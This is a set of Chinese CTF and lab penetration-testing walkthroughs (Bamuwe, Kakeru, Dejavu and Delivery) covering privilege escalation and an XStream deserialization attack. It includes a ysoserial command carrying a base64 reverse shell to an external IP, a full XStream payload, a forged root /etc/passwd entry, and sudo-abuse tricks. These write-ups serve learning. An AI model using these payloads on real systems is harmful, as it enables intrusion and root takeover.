(ALL) NOPASSWD: /opt/sub.sh\n~~~\n\n~~~\nwelcome@Bamuwe:~$ cat /opt/sub.sh\n/usr/bin/mosquitto_sub \"$@\" > /home/welcome/sub.log\n~~~\n\nmosquitto是一个消息代理软件mosquitto_sub是用来订阅的，对应的是\n\nmosquitto_pub\n\n[参考连接](https://blog.csdn.net/laoweieda/article/details/132735223)\n\n在kali上修改mosquitto的配置文件\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# vim /etc/mosquitto/mosquitto.conf\n~~~\n\n添加\n\n~~~\nlistener 1883\nbind_address 0.0.0.0\nallow_anonymous true\npassword_file /etc/mosquitto/pwflie.example\n~~~\n\n然后启动服务\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# mosquitto\n1746003305: mosquitto version 2.0.21 starting\n1746003305: Using default config.\n1746003305: Starting in local only mode. Connections will only be possible from clients running on this machine.\n1746003305: Create a configuration file which defines a listener to allow remote access.\n1746003305: For more details see https://mosquitto.org/documentation/authentication-methods/\n1746003305: Opening ipv4 listen socket on port 1883.\n1746003305: Opening ipv6 listen socket on port 1883.\n1746003305: mosquitto version 2.0.21 running\n~~~\n\n如果端口没有监听0.0.0.0的话可以用socat将1883转发出来\n\n然后再welcome的家目录创建一个软连接，指向/etc/passwd\n\n~~~\nwelcome@Bamuwe:~$ ln -sf /etc/passwd sub.log\n~~~\n\n将靶机里的/etc/passwd文件复制一份，添加一条用户信息\n\n~~~\nll:$1$Zg12rJZk$P7IV1RqAT005RKjprDSo41:0:0:root:/root:/bin/bash\n~~~\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# mosquitto_pub -t test -f passwd\n\nwelcome@Bamuwe:~$ sudo /opt/sub.sh -h 192.168.31.129 -p 1884 -t test\n~~~\n\n然后/etc/passwd就被覆盖了\n\n~~~\nwelcome@Bamuwe:~$ su - ll\n~~~\n\n密码是123123\n\n提权成功\n","tags":["靶机"],"categories":["660930334"]},{"title":"群友机-Kakeru","url":"/2025/04/29/群友靶机-Kakeru/","content":"\n\n\n# 信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:8f:69:69       PCS Systemtechnik GmbH\n192.168.31.170  08:00:27:bf:56:1c       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.170就是靶机ip地址\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.170 -p-\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-29 02:02 EDT\nNmap scan report for 192.168.31.170\nHost is up (0.0026s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:BF:56:1C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.22 seconds\n~~~\n\n# 80端口\n\n~~~\n <title>User welcome's password is here.</title>\n \n POST /login HTTP/1.1\nHost: 192.168.3.132\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 31\nOrigin: http://192.168.3.132\nConnection: keep-alive\nReferer: http://192.168.3.132/\nCookie: PHPSESSID=eiag23f4enj5tfcpl7t1qhhk2t\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\nusername=admin&amp;password=admin\n\n\n(<=x-).+(?=en)\n~~~\n\n有用的信息就是这些，从这可以得知存在welcome用户，然后告诉我们密码就在这里，还有一个正则表达式，可以联想到，密码应该就是用正则去匹配上面的数据包\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# http http://192.168.31.170|grep -P '(?<=x-).+(?=en)' -o\nwww-form-url\nhighlight\">(?&lt;=x-).+(?=\n~~~\n\n密码就是`www-form-url`\n\nssh登录\n\n# 提权\n\n~~~\nwelcome@Kakeru:~$ ls\nsudoers.bak  user.txt\nwelcome@Kakeru:~$ cat sudoers.bak\n#\n# This file MUST be edited with the 'visudo' command as root.\n#\n# Please consider adding local content in /etc/sudoers.d/ instead of\n# directly modifying this file.\n#\n# See the man page for details on how to write a sudoers file.\n#\nDefaults        env_reset\nDefaults        mail_badpass\nDefaults        secure_path=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\n\n# Host alias specification\n\n# User alias specification\n\n# Cmnd alias specification\n\n# User privilege specification\nroot    ALL=(ALL:ALL) ALL\n\n# Allow members of group sudo to execute any command\n%sudo   ALL=(ALL:ALL) ALL\nwelcome Dashazi=(kakeru) NOPASSWD: /usr/bin/less\nkakeru ALL=(ALL:ALL) NOPASSWD: /opt/test.sh\n# See sudoers(5) for more information on \"@include\" directives:\n\n@includedir /etc/sudoers.d\n~~~\n\nwelcome可以在Dashazi上以kakeru用户执行/usr/bin/less\n\n~~~\nwelcome@Kakeru:~$ sudo -u kakeru -h Dashazi /usr/bin/less --help\n!sh\n~~~\n\n~~~\nkakeru@Kakeru:/opt$ sudo -l\nMatching Defaults entries for kakeru on Kakeru:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser kakeru may run the following commands on Kakeru:\n    (ALL : ALL) NOPASSWD: /opt/test.sh\n~~~\n\n可以看到可以执行/opt/test.sh，但是内容没办法看，同时家目录也有一个test.sh,这两个文件可能存在关系\n\n~~~\nkakeru@Kakeru:/opt$ sudo /opt/test.sh\nPlease Input: a\n/opt/test.sh: line 5: a: command not found\n~~~\n\n运行发现只能输入一个字符，输入空格可以发现\n\n~~~\nkakeru@Kakeru:/opt$ sudo /opt/test.sh\nPlease Input:\n/opt/test.sh: line 5: /home/kakeru/test.sh: Permission denied\n~~~\n\n哎！报错了，指向家目录的test.sh，而家目录的test.sh是没有可执行权限的，所以就能知道程序以你输入的那个字符来运行/home/kakeru/test.sh，输入一个`.`\n\n~~~\nkakeru@Kakeru:~$ sudo /opt/test.sh\nPlease Input: .\ntest\n~~~\n\n会发现/home/kakeru/test.sh被执行了，将家目录的test.sh文件改个名再重新写一个test.sh\n\n~~~\nkakeru@Kakeru:~$ mv test.sh 1\nkakeru@Kakeru:~$ echo 'bash -p'>test.sh\nkakeru@Kakeru:~$ chmod +x ./test.sh\nkakeru@Kakeru:~$ sudo /opt/test.sh\nPlease Input:\nroot@Kakeru:/home/kakeru#\n~~~\n\n提权成功\n","tags":["靶机"],"categories":["660930334"]},{"title":"HackmyVM-Dejavu","url":"/2025/04/29/HackmyVM-Dejavu/","content":"\n\n\n# 信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:8f:69:69       PCS Systemtechnik GmbH\n192.168.31.169  08:00:27:b7:b2:91       PCS Systemtechnik GmbH\n~~~\n\n192.168.31.169就是靶机地址\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.169\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-04-28 22:42 EDT\nNmap scan report for 192.168.31.169\nHost is up (0.00087s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:B7:B2:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 6.88 seconds\n~~~\n\n# 80端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# gobuster dir -u \"http://192.168.31.169/\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.169/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/info.php             (Status: 200) [Size: 69969]\n~~~\n\n只能扫到一个info.php，是一个phpinfo页面，前端注释里有一个\n\n~~~\n<!-- /S3cR3t -->\n~~~\n\n访问/S3cR3t有一个upload.php,php后缀禁止上传，改后缀为phtml,有disable_function，可以用蚁剑的插件`绕过disable_functions`绕过\n\n反弹一个shell出来\n\n# 提权\n\n~~~\nwww-data@dejavu:/opt$ sudo -l\nMatching Defaults entries for www-data on dejavu:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on dejavu:\n    (robert) NOPASSWD: /usr/sbin/tcpdump\n~~~\n\n可以无密码以robert执行tcpdump\n\n~~~\nCOMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n~~~\n\n但是提权的时候提示权限不够，只能另寻他路\n\n上传一个pspy64，监控进程\n\n~~~\n2025/04/29 03:05:01 CMD: UID=1000  PID=1715   | /usr/sbin/CRON -f\n2025/04/29 03:05:01 CMD: UID=1000  PID=1716   | /bin/sh -c /home/robert/auth.sh\n2025/04/29 03:05:01 CMD: UID=1000  PID=1717   | /bin/sh /home/robert/auth.sh\n2025/04/29 03:05:01 CMD: UID=65534 PID=1719   | /usr/sbin/vsftpd /etc/vsftpd.conf\n2025/04/29 03:05:01 CMD: UID=0     PID=1718   | /usr/sbin/vsftpd /etc/vsftpd.conf\n2025/04/29 03:05:01 CMD: UID=1000  PID=1720   | /usr/sbin/vsftpd /etc/vsftpd.conf\n~~~\n\n发现robert会运行auth.sh，还和ftp有关系，用tcpdump抓一下包看看\n\n~~~\nwww-data@dejavu:/tmp$ sudo -u robert /usr/sbin/tcpdump tcp port 21 -i lo\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes\n03:09:01.651819 IP localhost.51594 > localhost.ftp: Flags [S], seq 1560518222, win 65495, options [mss 65495,sackOK,TS val 2363185351 ecr 0,nop,wscale 7], length 0\n03:09:01.651828 IP localhost.ftp > localhost.51594: Flags [S.], seq 206236889, ack 1560518223, win 65483, options [mss 65495,sackOK,TS val 2363185351 ecr 2363185351,nop,wscale 7], length 0\n03:09:01.651835 IP localhost.51594 > localhost.ftp: Flags [.], ack 1, win 512, options [nop,nop,TS val 2363185351 ecr 2363185351], length 0\n03:09:01.652915 IP localhost.ftp > localhost.51594: Flags [P.], seq 1:21, ack 1, win 512, options [nop,nop,TS val 2363185352 ecr 2363185351], length 20: FTP: 220 (vsFTPd 3.0.3)\n03:09:01.653039 IP localhost.51594 > localhost.ftp: Flags [.], ack 21, win 512, options [nop,nop,TS val 2363185352 ecr 2363185352], length 0\n03:09:01.653087 IP localhost.51594 > localhost.ftp: Flags [P.], seq 1:14, ack 21, win 512, options [nop,nop,TS val 2363185352 ecr 2363185352], length 13: FTP: USER robert\n03:09:01.653089 IP localhost.ftp > localhost.51594: Flags [.], ack 14, win 512, options [nop,nop,TS val 2363185353 ecr 2363185352], length 0\n03:09:01.653260 IP localhost.ftp > localhost.51594: Flags [P.], seq 21:55, ack 14, win 512, options [nop,nop,TS val 2363185353 ecr 2363185352], length 34: FTP: 331 Please specify the password.\n03:09:01.653312 IP localhost.51594 > localhost.ftp: Flags [.], ack 55, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 0\n03:09:01.653355 IP localhost.51594 > localhost.ftp: Flags [P.], seq 14:32, ack 55, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 18: FTP: PASS 9737bo0hFx4\n03:09:01.653357 IP localhost.ftp > localhost.51594: Flags [.], ack 32, win 512, options [nop,nop,TS val 2363185353 ecr 2363185353], length 0\n03:09:01.664382 IP localhost.ftp > localhost.51594: Flags [P.], seq 55:78, ack 32, win 512, options [nop,nop,TS val 2363185364 ecr 2363185353], length 23: FTP: 230 Login successful.\n~~~\n\n可以发现robert的密码是`9737bo0hFx4`,su切换用户\n\n~~~\nrobert@dejavu:/tmp$ sudo -l\nMatching Defaults entries for robert on dejavu:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser robert may run the following commands on dejavu:\n    (root) NOPASSWD: /usr/local/bin/exiftool\n~~~\n\nexiftool可以写入任意文件，写个公钥即可\n\n~~~\nLFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n~~~\n\n~~~\nrobert@dejavu:/tmp$ sudo exiftool -filename=$LFILE $INPUT\nError: '/root/.ssh/authorized_keys' already exists - ./authorized_keys\n~~~\n\n已经存在了，那就把这个公钥移动过来，在写公钥进去\n\n~~~\nrobert@dejavu:/tmp$ sudo exiftool -filename=./1 /root/.ssh/authorized_keys\nrobert@dejavu:/tmp$ sudo exiftool -filename=/root/.ssh/authorized_keys ./authorized_keys \n~~~\n\n然后ssh登录即可\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"春秋云镜-Delivery","url":"/2025/04/27/春秋云镜-Delivery/","content":"\n\n\n# FLAG01\n\n先用 fscan 进行一波信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# ../pentest/fscan/fscan2 -h 39.99.157.149\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     _ __  __ _ _ __ __ _  _ __| | __    │\n│  / /_\\/____/ _ _|/ _ _| '_ _/ _` |/ __| |/ /    │\n│ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\_ _,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-04-27 03:44:50] [INFO] 暴力破解线程数: 1\n[2025-04-27 03:44:50] [INFO] 开始信息扫描\n[2025-04-27 03:44:50] [INFO] 最终有效主机数量: 1\n[2025-04-27 03:44:51] [INFO] 开始主机扫描\n[2025-04-27 03:44:51] [INFO] 有效端口数量: 233\n[2025-04-27 03:44:51] [SUCCESS] 端口开放 39.99.157.149:22\n[2025-04-27 03:44:51] [SUCCESS] 端口开放 39.99.157.149:80\n[2025-04-27 03:44:51] [SUCCESS] 端口开放 39.99.157.149:21\n[2025-04-27 03:44:51] [SUCCESS] 服务识别 39.99.157.149:22 => [ssh] 版本: 8.2p1 Ubuntu 4ubuntu0.5 产品: OpenSSH 系统: Linux 信息: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-27 03:44:51] [SUCCESS] 服务识别 39.99.157.149:21 => [ftp] 版本: 3.0.3 产品: vsftpd 系统: Unix Banner: [220 (vsFTPd 3.0.3).]\n[2025-04-27 03:44:53] [SUCCESS] 端口开放 39.99.157.149:8080\n[2025-04-27 03:44:56] [SUCCESS] 服务识别 39.99.157.149:80 => [http]\n[2025-04-27 03:44:59] [SUCCESS] 服务识别 39.99.157.149:8080 => [http]\n[2025-04-27 03:45:00] [INFO] 存活端口数量: 4\n[2025-04-27 03:45:00] [INFO] 开始漏洞扫描\n[2025-04-27 03:45:00] [INFO] 加载的插件: ftp, ssh, webpoc, webtitle\n[2025-04-27 03:45:01] [SUCCESS] 网站标题 http://39.99.157.149      状态码: 200 长度: 10918  标题: Apache2 Ubuntu Default Page: It works\n[2025-04-27 03:45:02] [SUCCESS] 匿名登录成功!\n[2025-04-27 03:45:02] [SUCCESS] 网站标题 http://39.99.157.149:8080 状态码: 200 长度: 3655   标题: 公司发货单\n[2025-04-27 03:45:08] [SUCCESS] 扫描已完成: 6/6\n~~~\n\nftp 可以匿名登陆，登录之后可以下载一个 pom.xml\n\n~~~\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n< project xmlns = \"http://maven.apache.org/POM/4.0.0\" xmlns: xsi = \"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi: schemaLocation = \"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\" >\n    <modelVersion> 4.0.0 </modelVersion>\n    <parent>\n        <groupId> org.springframework.boot </groupId>\n        <artifactId> spring-boot-starter-parent </artifactId>\n        <version> 2.7.2 </version>\n        <relativePath/> <!-- lookup parent from repository -->\n    </parent>\n    <groupId> com.example </groupId>\n    <artifactId> ezjava </artifactId>\n    <version> 0.0.1-SNAPSHOT </version>\n    <name> ezjava </name>\n    <description> ezjava </description>\n    <properties>\n        <java.version> 1.8 </java.version>\n    </properties>\n    <dependencies>\n        <dependency>\n            <groupId> org.springframework.boot </groupId>\n            <artifactId> spring-boot-starter-thymeleaf </artifactId>\n        </dependency>\n        <dependency>\n            <groupId> org.springframework.boot </groupId>\n            <artifactId> spring-boot-starter-web </artifactId>\n        </dependency>\n\n        <dependency>\n            <groupId> org.springframework.boot </groupId>\n            <artifactId> spring-boot-starter-test </artifactId>\n            <scope> test </scope>\n        </dependency>\n\n        <dependency>\n            <groupId> com.thoughtworks.xstream </groupId>\n            <artifactId> xstream </artifactId>\n            <version> 1.4.16 </version>\n        </dependency>\n\n        <dependency>\n            <groupId> commons-collections </groupId>\n            <artifactId> commons-collections </artifactId>\n            <version> 3.2.1 </version>\n        </dependency>\n    </dependencies>\n\n    <build>\n        <plugins>\n            <plugin>\n                <groupId> org.springframework.boot </groupId>\n                <artifactId> spring-boot-maven-plugin </artifactId>\n            </plugin>\n        </plugins>\n    </build>\n\n</project>\n~~~\n\n存在有危险的依赖\n\n~~~\n <dependency>\n            <groupId> com.thoughtworks.xstream </groupId>\n            <artifactId> xstream </artifactId>\n            <version> 1.4.16 </version>\n        </dependency>\n\n        <dependency>\n            <groupId> commons-collections </groupId>\n            <artifactId> commons-collections </artifactId>\n            <version> 3.2.1 </version>\n        </dependency>\n~~~\n\n存在 [CVE-2021-29505](https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md) 用 ysoserial 进行反弹 shell\n\n~~~\njava -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 \" bash -c {echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuNzUuNzAuMjAyLzQ0NDQgMD4mMQ ==}|{base64,-d}|{bash,-i}\"\n~~~\n\n在 8080 端口抓包替换成 payload\n\n~~~\n<java.util.PriorityQueue serialization='custom'>\n    <unserializable-parents/>\n    <java.util.PriorityQueue>\n        <default>\n            <size> 2 </size>\n        </default>\n        <int> 3 </int>\n        <javax.naming.ldap.Rdn_-RdnEntry>\n            <type> 12345 </type>\n            <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n                <m__obj class='string'> com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content </m__obj>\n            </value>\n        </javax.naming.ldap.Rdn_-RdnEntry>\n        <javax.naming.ldap.Rdn_-RdnEntry>\n            <type> 12345 </type>\n            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>\n                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\n                    <parsedMessage> true </parsedMessage>\n                    <soapVersion> SOAP_11 </soapVersion>\n                    <bodyParts/>\n                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\n                        <attachmentsInitialized> false </attachmentsInitialized>\n                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\n                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>\n                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>\n                                    <names>\n                                        <string> aa </string>\n                                        <string> aa </string>\n                                    </names>\n                                    <ctx>\n                                        <environment/>\n                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>\n                                            <java.rmi.server.RemoteObject>\n                                                <string> UnicastRef </string>\n                                                <string> 106.75.70.202 </string>\n                                                <int> 1099 </int>\n                                                <long> 0 </long>\n                                                <int> 0 </int>\n                                                <long> 0 </long>\n                                                <short> 0 </short>\n                                                <boolean> false </boolean>\n                                            </java.rmi.server.RemoteObject>\n                                        </registry>\n                                        <host> 106.75.70.202 </host>\n                                        <port> 1099 </port>\n                                    </ctx>\n                                </candidates>\n                            </aliases>\n                        </nullIter>\n                    </sm>\n                </message>\n            </value>\n        </javax.naming.ldap.Rdn_-RdnEntry>\n    </java.util.PriorityQueue>\n</java.util.PriorityQueue>\n~~~\n\n发包之后 shell 就弹出来了，然后写个公钥进去，flag1 在/root/flag 下\n\n# FLAG02\n\n上传一个 fscan 扫描内网，再搭建一个代理\n\n~~~\nroot@ubuntu:~# ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 :: 1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e: 09:09:4b brd ff: ff: ff: ff: ff: ff\n    inet 172.22.13.14/16 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 315359007sec preferred_lft 315359007sec\n    inet6 fe80:: 216:3eff: fe09:94b/64 scope link\n       valid_lft forever preferred_lft forever\nroot@ubuntu:~# ./f\nflag/   fscan2\nroot@ubuntu:~# ./fscan2 -h 172.22.13.14/24\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     _ __  __ _ _ __ __ _  _ __| | __    │\n│  / /_\\/____/ _ _|/ _ _| '_ _/ _` |/ __| |/ /    │\n│ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\_ _,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-04-27 15:59:52] [INFO] 暴力破解线程数: 1\n[2025-04-27 15:59:52] [INFO] 开始信息扫描\n[2025-04-27 15:59:52] [INFO] CIDR 范围: 172.22.13.0-172.22.13.255\n[2025-04-27 15:59:52] [INFO] 生成 IP 范围: 172.22.13.0.%! d(string = 172.22.13.255) - %! s(MISSING).%! d(MISSING)\n[2025-04-27 15:59:52] [INFO] 解析 CIDR 172.22.13.14/24 -> IP 范围 172.22.13.0-172.22.13.255\n[2025-04-27 15:59:52] [INFO] 最终有效主机数量: 256\n[2025-04-27 15:59:52] [INFO] 开始主机扫描\n[2025-04-27 15:59:52] [SUCCESS] 目标 172.22.13.14    存活 (ICMP)\n[2025-04-27 15:59:52] [SUCCESS] 目标 172.22.13.6     存活 (ICMP)\n[2025-04-27 15:59:52] [SUCCESS] 目标 172.22.13.57    存活 (ICMP)\n[2025-04-27 15:59:52] [SUCCESS] 目标 172.22.13.28    存活 (ICMP)\n[2025-04-27 15:59:55] [INFO] 存活主机数量: 4\n[2025-04-27 15:59:55] [INFO] 有效端口数量: 233\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.57:22\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.14:22\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.14:21\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:80\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.57:80\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:135\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.14:80\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:135\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:445\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:88\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:389\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:139\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.6:139\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:445\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:3306\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.28:8000\n[2025-04-27 15:59:55] [SUCCESS] 端口开放 172.22.13.14:8080\n[2025-04-27 15:59:55] [SUCCESS] 服务识别 172.22.13.57:22 => [ssh] 版本: 7.4 产品: OpenSSH 信息: protocol 2.0 Banner: [SSH-2.0-OpenSSH_7.4.]\n[2025-04-27 15:59:56] [SUCCESS] 服务识别 172.22.13.14:22 => [ssh] 版本: 8.2p1 Ubuntu 4ubuntu0.5 产品: OpenSSH 系统: Linux  信息: Ubuntu Linux; protocol 2.0 Banner: [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-27 15:59:56] [SUCCESS] 服务识别 172.22.13.14:21 => [ftp] 版本: 3.0.3 产品: vsftpd 系统: Unix Banner: [220 (vsFTPd 3.0.3).]\n[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.57:80 => [http] 版本: 1.20.1 产品: nginx\n[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.6:445 =>\n[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.6:88 =>\n[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.28:80 => [http]\n[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.28:139 =>  Banner: [.]\n[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.6:389 =>\n[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.6:139 =>  Banner: [.]\n[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.28:445 =>\n[2025-04-27 16:00:01] [SUCCESS] 服务识别 172.22.13.28:8000 =>\n[2025-04-27 16:00:02] [SUCCESS] 服务识别 172.22.13.14:8080 => [http]\n[2025-04-27 16:00:02] [SUCCESS] 服务识别 172.22.13.14:80 => [http]\n[2025-04-27 16:00:09] [SUCCESS] 服务识别 172.22.13.28:3306 =>  Banner: [!.#08S01Got packets out of order]\n[2025-04-27 16:01:01] [SUCCESS] 服务识别 172.22.13.28:135 =>\n[2025-04-27 16:01:01] [SUCCESS] 服务识别 172.22.13.6:135 =>\n[2025-04-27 16:01:01] [INFO] 存活端口数量: 17\n[2025-04-27 16:01:01] [INFO] 开始漏洞扫描\n[2025-04-27 16:01:01] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.57       状态码: 200 长度: 4833   标题: Welcome to CentOS\n[2025-04-27 16:01:01] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.13.6\n主机名: WIN-DC\n发现的网络接口:\n   IPv4 地址:\n      └─ 172.22.13.6\n[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.28       状态码: 200 长度: 2525   标题: 欢迎登录 OA 办公平台\n[2025-04-27 16:01:01] [SUCCESS] 匿名登录成功!\n[2025-04-27 16:01:01] [SUCCESS] NetBios 172.22.13.6     DC: XIAORANG\\WIN-DC\n[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.14       状态码: 200 长度: 10918  标题: Apache2 Ubuntu Default Page: It works\n[2025-04-27 16:01:01] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.13.28\n主机名: WIN-HAUWOLAO\n发现的网络接口:\n   IPv4 地址:\n      └─ 172.22.13.28\n[2025-04-27 16:01:01] [SUCCESS] NetBios 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393\n[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.14:8080  状态码: 200 长度: 3655   标题: 公司发货单\n[2025-04-27 16:01:01] [SUCCESS] 网站标题 http://172.22.13.28:8000  状态码: 200 长度: 170    标题: Nothing Here.\n~~~\n\n题目提示了要打 NFS，先扫一下 2049 的端口\n\n~~~\nroot@ubuntu:~# ./fscan2 -h 172.22.13.14/24 -p 2049\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     _ __  __ _ _ __ __ _  _ __| | __    │\n│  / /_\\/____/ _ _|/ _ _| '_ _/ _` |/ __| |/ /    │\n│ / /_\\\\_ ____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\_ _,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan 